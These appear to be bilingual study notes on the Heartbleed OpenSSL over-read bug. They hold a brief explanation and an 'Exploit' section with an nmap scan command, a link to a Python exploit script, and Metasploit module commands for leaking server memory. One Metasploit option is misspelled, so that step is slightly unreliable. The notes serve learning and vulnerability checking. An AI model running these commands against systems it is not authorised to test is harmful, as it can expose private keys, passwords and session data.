> http://heartbleed.com/

# Heart-Bleed

## Introduction

**Heartbleed** is a security bug in the OpenSSL cryptography library, which is a widely used implementation of the Transport Layer Security (TLS) protocol. It was introduced into the software in 2012 and publicly disclosed in April 2014. Heartbleed may be exploited regardless of whether the vulnerable OpenSSL instance is running as a TLS server or client. It results from improper input validation (due to a missing bounds check) in the implementation of the TLS heartbeat) extension. Thus, the bug's name derives from *heartbeat*. The vulnerability is classified as a buffer over-read, a situation where more data can be read than should be allowed.

## Exploit

> 参考：https://www.cnblogs.com/wh4am1/p/6660022.html

### 使用 `nmap`

官网：https://nmap.org/nsedoc/scripts/ssl-heartbleed.html

使用：

```shell
$ nmap -p 443 --script ssl-heartbleed <ip-address>
```

或者使用 [python 脚本](https://gist.github.com/sh1n0b1/10100394)

### 使用 `metasploit`

```shell
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS <IP-address>
set PRORT <port>
set verbose true
run
```

